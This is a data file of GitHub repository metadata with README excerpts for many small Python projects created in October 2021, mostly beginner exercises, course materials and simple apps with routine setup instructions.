417046651;python-angular-blog-portfolio;https://github.com/geastlick/python-angular-blog-portfolio;Python;2021-10-14T08:18:28Z;0;0;0;"python-angular-blog-portfolio Portfolio project created during NuCamp Python-SQL bootcamp  update src/init.py create_app parameters, specifically the database URI execute ""flask db upgrade"".  This will apply all migrations. execute ""python seed.py"".  This will pre-populate the database tables with fake data.  There is a default user demo/demo for testing. execute ""flask run"".  This will start the API server.  By default it runs on http://localhost:5000/api/ You must have nodejs and npm installed execute ""cd ui; npm install; ng serve"".  This will start the Angular dev server at http://localhost:4200  Technology stack Back end  Python 3.9.6  Flask 2.0.1:  Provides server/controller application SQLAlchemy 1.4.17:  Provides database/model interface (ORM) Flask-SQLAlchemy 2.5.1 : Integrates the two  Various other supporting libraries mentioned in requirements.txt      Front end  TypeScript 4.3.5  Angular 12.2.9:  Provides SPA (Single Page Application) opinionated framework PrimeNG 12.2.0:  Component library for Angular PrimeFlex 3.0.1:  Styling css for PrimeNG  Various other supporting libraries mentioned in package.json      API    Method URI Description     POST api/login Payload: {username, password}.  Returns 400 if username/password not provided or username doesn't exist, otherwise, returns True if sucessful.   GET api/logout Deletes session data and returns True   GET api/self Returns 400 if no session, else returns user {id, username, name, email, block_until, avatar }   POST api/users Payload: {username, password, name, email}.  Returns 400 if any are not provided, username is less than 3 characters or password is less than 8 characters.  Also returns {error} 409 if username/email are already taken.  Returns created user {id, username, name, email, block_until, avatar} when successful   DELETE api/users/id:int Returns 400 if not logged in as the user to be deleted.  Logs out and returns true if successful   PUT, PATCH api/users/id:int Returns 400 if not logged in as the user to be deleted.  Will change username, name, email, or password depending on payload.  If changing password, then the old password must be provided as well.   GET api/authors Returns {id, name, avatar} or all authors who have published a blog order by name   GET api/blogs Returns {id, title, description, category} of all published blogs order by ratings    "
417056426;python_timer_destinator;https://github.com/briansune/python_timer_destinator;Python;2021-10-14T08:50:01Z;0;0;0;python_timer_destinator 
417113076;Dev-to-Python;https://github.com/chattarin63070025/Dev-to-Python;;2021-10-14T12:01:35Z;0;0;0;
417072855;python-random-quote;https://github.com/benny-china/python-random-quote;Python;2021-10-14T09:41:48Z;0;0;0;Let's Write a Python Quote Bot! This repository will get you started with building a quote bot in Python. It's meant to be used along with the Learning Lab intro to Python. When complete, you'll be able to grab random quotes from the command line, like this:  $ python get-quote.py Keep it logically awesome $ python get-quote.py Speak like a human  Start the Tutorial You can find your next step in this repo's issues! 
417180908;Python_To-do_list;https://github.com/TanZeus/Python_To-do_list;Python;2021-10-14T15:18:14Z;0;0;0;Python_To-do_list A to-do app created with python Contributors  Tanish Bhandwalkar - scarlet4293@gmail.com  
417113521;Star-Pattern-Using-Python;https://github.com/TanmayProgrammer-13/Star-Pattern-Using-Python;Python;2021-10-14T12:03:01Z;1;1;0;
417195840;python-basic-assignment-18;https://github.com/tharindu-frd/python-basic-assignment-18;Jupyter Notebook;2021-10-14T16:02:09Z;0;0;0;
417157860;Python-recipes-web;https://github.com/IRONALLEN/Python-recipes-web;Python;2021-10-14T14:15:48Z;0;0;0;
417191998;python_bytecode_viz;https://github.com/paul-tqh-nguyen/python_bytecode_viz;JavaScript;2021-10-14T15:51:01Z;0;0;0;python_bytecode_viz Visualizes the control flow graph of Python bytecode. 
417091664;Microservices-with-Python;https://github.com/tanvirewu/Microservices-with-Python;;2021-10-14T10:47:43Z;0;0;0;
417110938;Maths_Python_codes;https://github.com/aayushsrivastava0/Maths_Python_codes;Jupyter Notebook;2021-10-14T11:54:39Z;0;0;0;Python Codes for Maths using Jupiter notebook 
417108588;Pixel-Tracker-em-Python;https://github.com/catripilar/Pixel-Tracker-em-Python;Python;2021-10-14T11:46:49Z;0;0;0;Pixel-Tracker-em-Python Sistema de pré-inteligência artificial induzido, construido para localizar pixels invariaveis na tela sem a necessidade de treinamento (yolo ou haar cascade). Ultilizando o mínimo possível de processamento. É necessário a instalação interna de elementos como: pip install opencv-python pip install opencv-contrib-python 
417126022;python_useful_codes;https://github.com/peng22/python_useful_codes;Python;2021-10-14T12:42:42Z;0;0;0;
417045706;python_ULee_torch_nn;https://github.com/Ujs-lj/python_ULee_torch_nn;;2021-10-14T08:15:34Z;0;0;0;
417116073;advent-2020-python;https://github.com/betoma/advent-2020-python;Python;2021-10-14T12:10:56Z;0;0;0;
417090483;let-s-learn-python;https://github.com/codebysumit/let-s-learn-python;;2021-10-14T10:43:38Z;0;0;0;let-s-learn-python 
417184439;python_calc_app;https://github.com/WestPrime/python_calc_app;Python;2021-10-14T15:28:32Z;0;0;0;
417162757;Python-Assessment-Restaurant;https://github.com/Surajsharma00963/Python-Assessment-Restaurant;HTML;2021-10-14T14:29:16Z;0;0;0;
417108533;python-practice-program;https://github.com/pratik2229/python-practice-program;Jupyter Notebook;2021-10-14T11:46:40Z;0;0;0;python-practice-program 
417071650;Mysql-using-python-script;https://github.com/Mudassir-Hasan/Mysql-using-python-script;Python;2021-10-14T09:37:49Z;0;0;1;Mysql-using-python-script 
417042438;PPvIS_bot_python;https://github.com/JackMot/PPvIS_bot_python;;2021-10-14T08:04:52Z;0;0;1;PPvIS_bot_python 
417043373;My-First-Python-Project;https://github.com/sunshiro/My-First-Python-Project;Python;2021-10-14T08:07:56Z;0;0;0;My-First-Python-Project 
417190664;infra-playwright-python;https://github.com/SublateSamuel/infra-playwright-python;Python;2021-10-14T15:47:01Z;0;0;1;infra-playwright-python 
417185671;Lowest_Common_Ancestor_Python;https://github.com/DavyOLearyF/Lowest_Common_Ancestor_Python;Python;2021-10-14T15:32:18Z;0;0;0;
417128338;Simple-website-Python-;https://github.com/LikhithaSadavala/Simple-website-Python-;Python;2021-10-14T12:49:57Z;0;0;0;Simple website using python (flask module) 
417155023;TestRailPython;https://github.com/Sehqa/TestRailPython;Python;2021-10-14T14:07:36Z;0;0;0;TestRailPython Для работы теста необходимо в переменные окружения API_LOGIN и API_PASS добавить свой логин и пароль от test rail соответственно. 
417137626;Python-learn-Fall2021;https://github.com/Haadini/Python-learn-Fall2021;Python;2021-10-14T13:17:24Z;0;0;0;Python-learn-Fall2021 Python Course in Shahrood University of Technology  
417075525;python-project-lvl1;https://github.com/amiskov/python-project-lvl1;Python;2021-10-14T09:51:08Z;0;0;0;Hexlet tests and linter status:    Brain Even Demo  
417166660;python-basics-2;https://github.com/javierpb275/python-basics-2;Python;2021-10-14T14:39:49Z;0;0;0;
417113885;e-commerce-python-django;https://github.com/RonaldoLopes/e-commerce-python-django;Python;2021-10-14T12:04:12Z;0;0;0;e-commerce-python-django Sistema de e-commerce com Python e Django Instalações  pip install django pip install django-crispy-forms pip install pillow pip install pylint-django  
417193097;analise_lojas_python;https://github.com/Moutinho1982/analise_lojas_python;;2021-10-14T15:54:17Z;0;0;0;
417070527;python-random-quote;https://github.com/evansswh123/python-random-quote;Python;2021-10-14T09:34:08Z;0;0;0;Let's Write a Python Quote Bot! This repository will get you started with building a quote bot in Python. It's meant to be used along with the Learning Lab intro to Python. When complete, you'll be able to grab random quotes from the command line, like this:  $ python get-quote.py Keep it logically awesome $ python get-quote.py Speak like a human  Start the Tutorial You can find your next step in this repo's issues! 
417058988;python_args_kwargs;https://github.com/atmygml/python_args_kwargs;;2021-10-14T08:58:29Z;0;0;0;python_args_kwargs2 
417093903;Covid-19Tracker-python;https://github.com/ankitrajbiswal/Covid-19Tracker-python;Python;2021-10-14T10:55:36Z;0;0;0;Covid-19Tracker-python This is a minor project which is based on extracting the Covid-19 Details of Countries in world. Python Language was used for creating this project. About Now a days, as the entire world is suffering from COVID-19 and it ha sbecome one of the most deadliest virus in the world. Almost entire world suffered through this. This Project is a small effort to aware people regarding the COVID-19 cases in the world and its related stats. Tech Stack I have coded this project using Python,. This project has very minimal UI, in order to avoid complications. Though This project can also be created by any other programming languages such as - C#,C++ or JAVA Conclusion This project has been made with Python, and currently its UI have been kept extreamly simple, but few tweaks have to be made by me in UI to make this look more beautiful and appealing, the code will also be optimized a bit. References The entire help taken will creating this project was from www.google.com. Contributor Name : Ankit Raj Biswal Registration No. : 1941012238 College: Institute of Technical Education and Research Rest You are Good to Go!!!  🤘 🍻 
417160821;franka_ros_python;https://github.com/uniudlabrobotica/franka_ros_python;Python;2021-10-14T14:24:05Z;0;0;0;franka_ros_python roslaunch franka_gripper franka_gripper.launch robot_ip:=172.16.0.2 roslaunch franka_example_controllers move_gripper.py 
417123392;TestPython_1006;https://github.com/colleenInKorea/TestPython_1006;Python;2021-10-14T12:34:25Z;0;0;0;
417142633;Python-AlgorithmSet;https://github.com/Maulanawesome5/Python-AlgorithmSet;Python;2021-10-14T13:32:23Z;0;0;0;
417051857;python-acoustic-backscatter-analysis;https://github.com/sebastianmenze/python-acoustic-backscatter-analysis;Python;2021-10-14T08:34:53Z;0;0;0;python-acoustic-backscatter-analysis a collection of python scripts to analyse acoustic backscatter data from moored or vessel mounted echosounders 
417098742;python-source-codes;https://github.com/taxicabora/python-source-codes;;2021-10-14T11:12:17Z;0;0;0;python-source-codes 
417116291;Linked-lists-Python;https://github.com/ashraf-khan-laetottenham-ac-uk/Linked-lists-Python;Python;2021-10-14T12:11:43Z;0;0;0;
417124340;python_cfd_book;https://github.com/tekete111011/python_cfd_book;;2021-10-14T12:37:25Z;0;0;0;Pythonで学ぶ 流体力学の数値計算法 という本を勉強してプログラムを置いていこうと思います。 三日坊主にならんといいな。 
417190160;docker_monitoring_python;https://github.com/redoper1/docker_monitoring_python;Python;2021-10-14T15:45:36Z;0;0;0;docker monitoring - python 
417154722;python-basic-algo;https://github.com/ac2393921/python-basic-algo;Python;2021-10-14T14:06:49Z;0;0;0;python-basic-algo 自分用のデータアルゴリズム&構造のパッケージ(ほぼほぼ備忘録) Installation git clone https://github.com/ac2393921/python-basic-algo.git Usage from python-basic-algo import sort  sort.bogo_sort([4, 5, 1, 3, 2]) License MIT 
417063124;PASSWORD_GENERATOR_python;https://github.com/nawafSheddi/PASSWORD_GENERATOR_python;Python;2021-10-14T09:11:47Z;0;0;0;
417126881;python-project-lvl3;https://github.com/sgmdlt/python-project-lvl3;Python;2021-10-14T12:45:23Z;0;0;0;Hexlet tests and linter status:     Page Loader simple cli-utility to download web pages  
417054155;CurrencyConvertorPython;https://github.com/YashRudani/CurrencyConvertorPython;;2021-10-14T08:42:35Z;0;0;0;
417171293;Python-Simple-Calculator-;https://github.com/KenkoMarinho/Python-Simple-Calculator-;Python;2021-10-14T14:52:30Z;0;0;0;
417156252;PYTHON_12_OCT_2021;https://github.com/srikanthpragada/PYTHON_12_OCT_2021;;2021-10-14T14:11:12Z;0;0;0;
417170529;job-scrapper-python;https://github.com/kimtothechang/job-scrapper-python;Python;2021-10-14T14:50:19Z;0;0;0;Welcome to Job Scrapper! 
417085843;Rest-API-Flask-Python;https://github.com/sparsh459/Rest-API-Flask-Python;Python;2021-10-14T10:26:47Z;0;0;0;
417087343;techShopPythonDjango;https://github.com/lion160801/techShopPythonDjango;Python;2021-10-14T10:32:08Z;0;0;0;
417160149;intro-linkeddata-mongo-python;https://github.com/polyneme/intro-linkeddata-mongo-python;Jupyter Notebook;2021-10-14T14:22:13Z;1;1;0;"Introduction to Linked Data and MongoDB with Python This repository contains materials to support an email course of the same name. Details below. Status [1/4]:   desired end state reached through meandering Jupyter notebook narrative  desired code/notebook states at end of each topic recorded [6/6]  course videos recorded  course videos edited/reviewed/approved  Setup  Install Miniconda on your system. make conda-env-create conda activate course-intro-ld-mongo make init make conda-env-ensure-ipython-kernel  Launch a new Jupyter Notebook for your work  cd intro_ld_mongo jupyter notebook Create a New notebook using the ""Python (course-intro-ld-mongo)"" kernel.  Email Course JSON is a common, convenient medium for data exchange. However, collaborators often find it challenging to similarly exchange the intended meanings of JSON objects, their fields, and their field values. Furthermore, one often wants to search the data in ways that do not fit the JSON object schema as given, or that otherwise require many ""joins"" across JSON object collections. What if there was a way to embed a JSON document's meaning within it, so that terminology definitions accompany the data on exchange? What if any JSON object could be decomposed into a graph of constituent facts, where the graph could either be searched directly or recomposed into a JSON object schema more appropriate for a given application? There are open protocols, standards, and Python-based tools to help you with all of the above. I'd like to take you on a journey through nobelprize.org's open data on Nobel prizes and laureates. Through the lenses of Linked Data, MongoDB, and Python, you'll learn about knowledge graphs, document-oriented databases, and how they are related. The promise of this course is that you will learn how to disseminate your research data as supplementary information to articles in a way that is more aligned with FAIR principles –findable, accessible, interoperable, and reusable – and therefore increase the likelihood that your published results are cited and used. Here is an outline of topics I will cover over six (6) emails:  Linked Data  Representing facts: RDF graphs via RDFLib Representing terminology: RDFS and OWL Knowledge graph search: SPARQL   JSON-LD and search over a collection of documents  Representing entities: collections and JSON documents Framing linked-data subgraphs as documents: JSON-LD via the PyLD processor Document collection search: MongoDB via the PyMongo driver    To sign up for this free email course, let me know at donny@polyneme.xyz. "
417188055;Tkinter-Python-GUI;https://github.com/DharaneeswaranR/Tkinter-Python-GUI;Python;2021-10-14T15:39:24Z;0;0;0;Tkinter-Python-GUI Creating a simple Hours-Mins to Seconds converter with GUI using python Tkinter module. To install Tkinter You need latest version of Python to use pip installer. Type the below text in your terminal. pip install tkinter  
417081449;python-inference-script;https://github.com/microsoft/python-inference-script;;2021-10-14T10:10:54Z;0;0;0;
417055954;Python-Django-Project;https://github.com/nitinchhabhaiya/Python-Django-Project;;2021-10-14T08:48:26Z;0;0;0;
417168702;My-python-codes;https://github.com/Asongna-frank/My-python-codes;Python;2021-10-14T14:45:20Z;0;0;0;
417171810;python-random-quote;https://github.com/Yuhigawa/python-random-quote;Python;2021-10-14T14:53:54Z;0;0;0;Let's Write a Python Quote Bot! This repository will get you started with building a quote bot in Python. It's meant to be used along with the Learning Lab intro to Python. When complete, you'll be able to grab random quotes from the command line, like this:  $ python get-quote.py Keep it logically awesome $ python get-quote.py Speak like a human  Start the Tutorial You can find your next step in this repo's issues! 
417171852;python_lessons_one;https://github.com/andrymachnev/python_lessons_one;Python;2021-10-14T14:54:01Z;0;0;0;
417176211;5th-Python-Lab;https://github.com/SomesanI/5th-Python-Lab;;2021-10-14T15:05:22Z;0;0;0;
417089998;BHF_Python_workshop;https://github.com/estherpuyol/BHF_Python_workshop;Jupyter Notebook;2021-10-14T10:41:53Z;0;0;0;"BHF_Python_workshop Code and data for the BHF workshop. The goals of this short course on Python is to give a basic introduction. By the end of this workshop you should:  Program using Python Integrated Development Environments (IDEs) and gain familiarity with Ipython Notebooks Manipulate simple variable types, operators and conditions Write loops and functions Gain familiarity with data science libraries: Numpy, Pandas and MatplotLib  The exercises for this workshop are organized into Jupyter Notebooks which is a way of serving executable Python code on a web page. A local Jupyter server can be run by installing it with Anaconda (or Miniconda), or through the internet using Google's Colaboratory service. Slides can also be viewed online at https://nbviewer.jupyter.org/github/estherpuyol/BHF_Python_workshop Getting Started With Colaboratory In this workshop, we will be using Google Colaboratory to run our notebooks, but if you want you can run all the notebooks. To get going with Colab:  Go to https://colab.research.google.com (be sure to be logged into your Google account beforehand) Click on the Github tab and enter https://github.com/estherpuyol/BHF_Python_workshop/ into the search box A number of notebooks should appear, double click the one to load. You can start using the notebooks by clicking on the run icons to the left of each cell or press ctrl+Enter. (You will get popups about the notebook not being authored by Google and other things, just click Yes to these)  Installing Python Locally If you want to run locally, you need to install Python 3.7, Numpy, Jupyter, and Matplotlib. These can be installed separately through the standard distributions from the sites for each package, or using a managed package system like Anaconda/Miniconda. The fastest way is with Miniconda:  Go to https://docs.conda.io/en/latest/miniconda.html and download the Python 3.7 64bit installer for your OS. Install Miniconda, checking the box to set the PATH variable In the Start Menu, go to ""Anaconda3"" -> ""Anaconda Prompt"" Type conda install jupyter matplotlib to install the components needed. To start Jupyter, from this console type jupyter notebook  The complete but slow way is with Anaconda.  Go to https://www.anaconda.com/distribution and download the Python 3.7 graphical installer for your OS. Install Anaconda, following instructions here: https://docs.anaconda.com/anaconda/install/ Start the Anaconda Navigator program Navigate to ""Environments"" and click on ""base (root)"" On the right side click ""Update index..."" Once that completes set the drop-down menu to show all and type ""Pandas"" into the search box Pandas 1.3.3 should show up, select it and install Return to home and launch Jupyter Notebook. This should bring to your browser with the notebook server running. From here you can navigate to the workshop directory and start a notebook.  Links  Numpy manual: https://docs.scipy.org/doc/numpy/ Matplotlib manual: https://matplotlib.org/3.1.0/users/index.html Python tutorial: https://www.python.org/about/gettingstarted Python tutorial: http://www.learnpython.org  "
417042322;hand-detection-in-python;https://github.com/kevalCoder9106/hand-detection-in-python;Python;2021-10-14T08:04:30Z;0;0;0;
417052618;Pong-game-using-python-;https://github.com/Aftabmallick/Pong-game-using-python-;Python;2021-10-14T08:37:18Z;0;0;0;Pong-game-using-python- Simple and easy to understand python game Left paddle: w for up s for down Right paddel: up switch for up down switch for down 
417128844;Packet-Sniffing-with-Python-;https://github.com/eminebusrasalihoglu/Packet-Sniffing-with-Python-;Python;2021-10-14T12:51:30Z;0;0;0;Packet-Sniffing-with-Python 
417148894;JogoNumerosPython;https://github.com/bfc1557/JogoNumerosPython;Python;2021-10-14T13:50:41Z;0;0;0;
417111720;mini_python_projects;https://github.com/jpmmatias/mini_python_projects;Python;2021-10-14T11:57:10Z;0;0;0;
417077202;Loan_calculator_Python;https://github.com/ayushnagarcodes/Loan_calculator_Python;Python;2021-10-14T09:56:59Z;0;0;0;"Loan Calculator I created a loan calculator using basic python and command-line fundamentals. It has two versions:-  The first one ""Loan_calculator_annuity.py"" can be run in an IDE only. It calculates:-  number of monthly payments annuity monthly payment amount which is fixed during the whole loan term loan principal   The second one ""Loan_calculator_command-line.py"" can only be run through command-line. It can:-  calculate all the things that the 1st program was able to Additionally, it can also calculate differentiated payment. It also prompts users for invalid inputs.    "
417127573;Leetcode-cn_python_solution;https://github.com/mairuian/Leetcode-cn_python_solution;;2021-10-14T12:47:30Z;0;0;0;Leetcode-cn_python_solution this platform is record some python functions to solve some leetcode  problem 
417167266;python-djangos-starter;https://github.com/MingyeomKim/python-djangos-starter;Python;2021-10-14T14:41:19Z;0;0;0;
417112475;algorithm_test_python_211014;https://github.com/hancandice/algorithm_test_python_211014;Python;2021-10-14T11:59:41Z;0;0;0;algorithm_test_python_211014 
417194183;Pong-Game-Python;https://github.com/PavitarSharma/Pong-Game-Python;Python;2021-10-14T15:57:34Z;0;0;0;Pong-Game-Python 
417057931;rust2python;https://github.com/miaoyc666/rust2python;;2021-10-14T08:54:58Z;0;0;0;[用Rust语言实现Python内置函数] 
417139116;python-Face-Detection;https://github.com/Shivansh-yadav13/python-Face-Detection;Python;2021-10-14T13:21:54Z;0;0;0;
417106688;python_algri_datastruct;https://github.com/kids0cn/python_algri_datastruct;;2021-10-14T11:40:07Z;0;0;0;
417061141;Python-100d-Challenge;https://github.com/Foreseen808/Python-100d-Challenge;Python;2021-10-14T09:05:06Z;0;0;0;Python-100d-Challenge Python 100 day learning challenge 
417183590;While-for-python;https://github.com/NunesDevs/While-for-python;Python;2021-10-14T15:25:52Z;0;0;0;Calculadora-1 Projeto com alguns exemplos de estrutura de repetição em python:  for while  
417165903;data_structures;https://github.com/ChristineWasike/data_structures;Python;2021-10-14T14:37:37Z;0;0;0;
417155574;assignment;https://github.com/rimanpreetkaur/assignment;Python;2021-10-14T14:09:19Z;0;0;0;assignment python assignment 
417068372;Sample;https://github.com/SandaryaPaul/Sample;;2021-10-14T09:27:18Z;0;0;0;Sample Python basic 
417068935;64011712;https://github.com/Worranan/64011712;Python;2021-10-14T09:29:11Z;0;0;0;64011712 python Kmitl 
417173203;Break-and-Continue-statement-python;https://github.com/ASJADSYED08/Break-and-Continue-statement-python;Python;2021-10-14T14:57:48Z;0;0;0;
417047180;sophomore_python_1230_oct_21;https://github.com/digipodium/sophomore_python_1230_oct_21;Python;2021-10-14T08:20:10Z;0;0;0;
417134360;Intro_to_CS_with_Python;https://github.com/Hsu-Tzu-Huan/Intro_to_CS_with_Python;Python;2021-10-14T13:08:01Z;0;0;0;
417112655;Book_ElementaryMechanicsUsingPython;https://github.com/WalkTheDocs/Book_ElementaryMechanicsUsingPython;Jupyter Notebook;2021-10-14T12:00:20Z;0;0;0;Elementary Mechanics Using Python ISBN: 9783319386843 Jupyter Notebook venv Install   # With active venv   python -m ipykernel install --user --name=Book_Elementary_Mechanics_Using_Python   Jupyter Notebook  
417194469;Misiontic2022-Ciclo1-Python;https://github.com/pauloaceroweb/Misiontic2022-Ciclo1-Python;Python;2021-10-14T15:58:25Z;0;0;0;
417046825;practical-python-14.10.21;https://github.com/atso-devs/practical-python-14.10.21;;2021-10-14T08:19:02Z;0;0;0;Практические занятие по Python Дата задания: 14.10.21. Дата сдачи: 25.10.21 (примерная дата рубежки). ТЗ. Дано: Матрица A, вектор x и вектор y А = [[2, 1, 9], [5, 3, 7], [2, 8, 4]] x = [-1, 4, 7] y = [2, 9, 6] Задания:  Распечатать первую строку матрицы A Распечатать второй столбец матрицы A Распечатать в обратном порядке элементы x Распечатать A[2, 2] Распечатать элементы [2, 8] из матрицы A Найти скалярное произведение вектора x на вектор y Найти результат умножения матрицы А на вектор х Найти результат умножения матрицы А на матрицу А Найти результат транспонирования матрицы А Найти результат вычисления определителя матрицы А  
417117345;Small-IQ-Test-python-thingy;https://github.com/DonutsNTacos/Small-IQ-Test-python-thingy;Python;2021-10-14T12:15:21Z;0;0;0;
417044054;python-full-stack-terminal-blog;https://github.com/B1r2a3d4l5y/python-full-stack-terminal-blog;Python;2021-10-14T08:10:23Z;0;0;0;
417130533;PHP4_omori_09_Python;https://github.com/oshinichi/PHP4_omori_09_Python;Jupyter Notebook;2021-10-14T12:56:38Z;0;0;0;PHP3_python_omori_09 課題内容（どんな作品か） PHPは、なんとなくですが、一通りできたような気がしているので。 チャレンジとしてpythonを引き続き使ってみた。 前回は、形態素解析をやってみたが、今回は、AIを体験してみた。 コード自体はとてもシンプル。 使い方 　グーグルコラボのため、ランタイムでそのまま実行。 途中ファイル読み込みが必要であるが、キャンセルでそのまま進む。 　すでに読み込まれたファイルで３つのグループにクラス分けがおこわなれる。 これを使って、この場合、英語と日本語の相関でクラス分けしているが、 例えば、英語が得意であるが日本語が不得手の層に対して何らかの対策や場合によっては売り込みをかけるといった効果的な 対応が可能となるらしい。 工夫した点・こだわった点 　グーグルコラボから離れた上でプログラムとして独立して動かしたかったが時間が足りず断念。 丁寧に時間をかければできるような気がする。 参考文献等 　今回も、入門者のpython、python完全入門、python実践機械学習１００本ノックを参考にプログラミング。 質問・疑問（あれば） 　数字を扱う系はなんとなく好きなので色々できそうな気になってきた。 
417141943;Python-for-Data-Analyst-Exercise;https://github.com/Yanan2018/Python-for-Data-Analyst-Exercise;;2021-10-14T13:30:18Z;0;0;0;
417056875;python-boto3-rds-guide;https://github.com/unbiased-coder/python-boto3-rds-guide;Python;2021-10-14T08:51:30Z;0;0;0;Python Boto3 RDS Guide In this repo I have code to accompany my blog post: https://unbiased-coder.com/python-boto3-rds-guide On how to setup and have a fully working example using Boto3 RDS 
417156152;DICT_python_education_Severyn_Olexandra;https://github.com/OlexandraSeveryn/DICT_python_education_Severyn_Olexandra;Python;2021-10-14T14:10:56Z;0;0;0;Sewerin Alexandra 519 Проскура Галина Анатольевна 
417053325;rock_paper_scissor-with-python;https://github.com/tanjimbinamin/rock_paper_scissor-with-python;Python;2021-10-14T08:39:44Z;0;0;0;
417090050;Python-Basics-for-Data-Science;https://github.com/carmelocs/Python-Basics-for-Data-Science;Jupyter Notebook;2021-10-14T10:42:01Z;0;0;0;
417084514;percepton-algo-simple-in_python;https://github.com/TarikMisimovic/percepton-algo-simple-in_python;Python;2021-10-14T10:22:09Z;0;0;0;
417164636;python_in_docker_vimspector_example;https://github.com/TamaMcGlinn/python_in_docker_vimspector_example;Shell;2021-10-14T14:34:18Z;0;0;0;"The missing vimspector python docker documentation Since I spent more time than I would care to admit in getting a trivial python-in-docker example working with vimspector, here are my findings: Have a look at .vimspector.json; the attach-run configuration first runs the included run_with_debugpy shell script, which runs the given script with debugpy inside of a newly created docker container. Opening any python file in this repo and issuing :vimspector#Launch() should just work. However, I have found that adding stopAtEntry: true does nothing, and hence you need to first add a breakpoint; otherwise, I guess by the time vimspector connects and issues that first stop command, the debugpy process is already finished executing the script. "
417068256;100-Days-of-Code-Python;https://github.com/burcia1711/100-Days-of-Code-Python;Python;2021-10-14T09:26:56Z;0;0;0;
417084443;random_code_generator_using_python;https://github.com/akhilavraju/random_code_generator_using_python;;2021-10-14T10:21:53Z;0;0;0;
417127160;QR-Code-generator-using-python;https://github.com/shreya-markhedkar/QR-Code-generator-using-python;Python;2021-10-14T12:46:16Z;0;0;0;QR-Code-generator-using-python Python makes it really easy to create QR code and decode it  Check it out! 
417106584;python_l2_l3;https://github.com/nazstukalo/python_l2_l3;Python;2021-10-14T11:39:47Z;0;0;0;python_l2_l3 
417087459;Python-Sqlite3-Tkinter-CRUD;https://github.com/vitotorres/Python-Sqlite3-Tkinter-CRUD;Python;2021-10-14T10:32:35Z;0;0;0;Python-Sqlite3-Tkinter-CRUD Product application 
417181745;Guess-the-correct-number-python;https://github.com/ASJADSYED08/Guess-the-correct-number-python;Python;2021-10-14T15:20:42Z;0;0;0;
417092935;python-exercise-1-and-2;https://github.com/Xhourstoprogram/python-exercise-1-and-2;Python;2021-10-14T10:52:11Z;0;0;0;
417100925;python_chrome_driver_oto_gunceleme;https://github.com/kimseler14/python_chrome_driver_oto_gunceleme;Python;2021-10-14T11:19:58Z;0;0;0;python_chrome_driver_oto_gunceleme otomatik chrome driver güncelleme win10'da test edilmiştir. windows için hazırlanmıştır 
417176270;aws-lambda-layer-python-rawpy;https://github.com/ServerlessOpsIO/aws-lambda-layer-python-rawpy;Makefile;2021-10-14T15:05:33Z;0;0;0;
417152731;Games;https://github.com/Saurabhgupta301/Games;Jupyter Notebook;2021-10-14T14:01:20Z;0;0;0;Games Games using Python 
417169081;Grade-Book;https://github.com/Boateng24/Grade-Book;Python;2021-10-14T14:46:26Z;0;0;0;Grade-Book Codecademy Python list project 
417050335;alabuga;https://github.com/Suhoy95/alabuga;;2021-10-14T08:30:01Z;0;0;0;
417071936;snippets;https://github.com/jerrychen1990/snippets;;2021-10-14T09:38:46Z;0;0;0;snippets useful snippets in python 
417105012;anappinpy;https://github.com/codewithPanwar/anappinpy;Python;2021-10-14T11:34:17Z;0;0;0;anappinpy sample python project 
417145487;stepik;https://github.com/paveldats/stepik;;2021-10-14T13:40:54Z;0;0;0;
417152040;Mini-Projects;https://github.com/Saurabhgupta301/Mini-Projects;Jupyter Notebook;2021-10-14T13:59:30Z;0;0;0;Mini-Projects Python projects for beginners 
417167036;pyLabs;https://github.com/eMintyBoy/pyLabs;Python;2021-10-14T14:40:44Z;0;0;0;
417153678;ubsi-logic-algorithm-task-5;https://github.com/dyvue/ubsi-logic-algorithm-task-5;Python;2021-10-14T14:03:53Z;0;0;0;Campus UBSI Logic and Algorithm Task 5 Looping with python 
417046768;Algorithms;https://github.com/AhmedFry/Algorithms;Python;2021-10-14T08:18:49Z;0;0;0;Algorithms Some Algorithms with Python 
417125556;mostasim_qups_assignment;https://github.com/tasim313/mostasim_qups_assignment;Python;2021-10-14T12:41:18Z;0;0;0;Need Python version 3.8 virtual environment = conda Need python packages run this program At first open your terminal and install Selenium => pip install selenium install pyperclip => pip install pyperclip test case we have install allure and pytest python packages 
417114032;mini-project;https://github.com/ABJANANI/mini-project;Python;2021-10-14T12:04:38Z;0;0;0;mini-project python mini project ideas 
417166257;PyTabsam;https://github.com/StatistikStadtZuerich/PyTabsam;Python;2021-10-14T14:38:41Z;0;0;0;PyTabsam Python Excel Tabellensammlung 
417165266;test_plotter;https://github.com/gamico001/test_plotter;Python;2021-10-14T14:35:55Z;0;0;0;
417168149;LHD_rock-paper-scissors;https://github.com/Riyamittal15/LHD_rock-paper-scissors;Python;2021-10-14T14:43:48Z;0;0;0;LHD_rock-paper-scissors A simple python project 
417150936;prooktatas;https://github.com/devloulou/prooktatas;Python;2021-10-14T13:56:17Z;0;0;0;prooktatas python programming lectures 
417128280;BooksGit;https://github.com/banegaaaa/BooksGit;Python;2021-10-14T12:49:42Z;0;0;0;
417083888;GCPPython;https://github.com/CDSCapstone/GCPPython;Python;2021-10-14T10:19:47Z;0;0;0;Google Cloud Platform Python Samples Python samples for Google Cloud Platform products.     Setup   Install pip and virtualenv if you do not already have them.   Clone this repository: git clone https://github.com/GoogleCloudPlatform/python-docs-samples.git    Obtain authentication credentials. Create local credentials by running the following command and following the oauth2 flow (read more about the command here): gcloud auth application-default login  Read more about Google Cloud Platform Authentication.   How to run a sample   Change directory to one of the sample folders, e.g. logging/cloud-client: cd logging/cloud-client/    Create a virtualenv. Samples are compatible with Python 3.6+. python3 -m venv env source env/bin/activate    Install the dependencies needed to run the samples. pip install -r requirements.txt    Run the sample: python snippets.py    Contributing Contributions welcome! See the Contributing Guide. 
417100694;zz_spider;https://github.com/qpzzk/zz_spider;Python;2021-10-14T11:19:08Z;0;0;0;"本代码是有关消息中间件组件的一些使用 ##rabbimq import zz_spider from zz_spider.rabbit_mq.MqDeal import DealRabbitMQ  使用 # -*- coding: utf-8 -*- # @Time    : 10/14/21 5:38 PM # @Author  : ZZK # @File : test_spider.py # @describe ： from zz_spider.rabbit_mq.MqDeal import DealRabbitMQ  host = '' port = 1234 #组件连接rabbitmq的端口 user = '' password = '' queue_name = '' url_port = 12345  #url方式组件连接rabbitmq的端口  def spider(res):     """"""     爬虫主体     :param res:  接收的消息原变量，1000条种子为一个list     :return:      """"""     for i in res:         print(i)  mq = DealRabbitMQ(host,user,password,queue_name,port,url_port) print(mq.get_count_by_url()) mq.run_mq(spider) #爬虫的主体函数    如需帮助请联系 zzk_python@163.com  "
417073321;family_recipes;https://github.com/thandi1908/family_recipes;;2021-10-14T09:43:17Z;0;0;0;
